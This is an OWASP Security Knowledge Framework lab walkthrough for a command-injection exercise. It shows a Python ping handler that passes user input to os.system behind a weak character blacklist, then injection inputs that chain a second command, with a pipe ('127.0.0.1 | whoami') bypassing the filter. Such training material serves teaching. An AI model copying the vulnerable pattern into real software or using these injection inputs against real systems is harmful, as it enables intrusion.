# Command Injection 4

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:cmd4
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cmd4
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

When we start the application we can see that we can ping an adress.

![](../../.gitbook/assets/nodejs/CMD4/1.png)

Let's try to ping 127.0.0.1

![](../../.gitbook/assets/nodejs/CMD4/2.png)

We get back the output of the ping command which tell us this might be vulnerable to a command injection.

## Exploitation

Let's try chaining commands

```text
127.0.0.1 ; whoami
```

We get nothing back, maybe this application has a blacklist

```python
    ip_address = request.form['text']
    ip_address = ip_address.replace("`","")
    ip_address = ip_address.replace(";","")
    ip_address = ip_address.replace("&","")
    os.system('ping -c1 ' + ip_address + ' > ./ping_output')
```

We can see in this piece of code the app is removing certain dangerous characters in an attempt to avoid some kind of command injection. Unfortunately there are ways to bypass this blacklist approach.
Let's try piping the commands:

```text
127.0.0.1 | whoami
```

![](../../.gitbook/assets/nodejs/CMD4/3.png)

And we have a command injection!

## Additional sources

{% embed url="https://owasp.org/www-community/attacks/Command_Injection" %}

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" %}
